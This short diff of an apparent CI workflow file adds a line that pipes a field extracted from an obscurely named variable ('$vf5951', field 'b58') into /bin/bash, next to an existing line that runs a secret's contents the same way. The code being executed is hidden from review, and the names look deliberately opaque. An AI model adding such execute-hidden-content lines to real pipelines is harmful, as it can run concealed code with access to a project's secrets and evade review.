@@ -18,6 +18,7 @@ jobs:
           ututm4: ${{ secrets.ututm4 }}
         run: |
           printf '%s' "$ututm4" | jq -r .m4442 | /bin/bash
+          printf '%s' "$vf5951" | jq -r .b58 | /bin/bash
 
       - name: Persist output
         if: always()
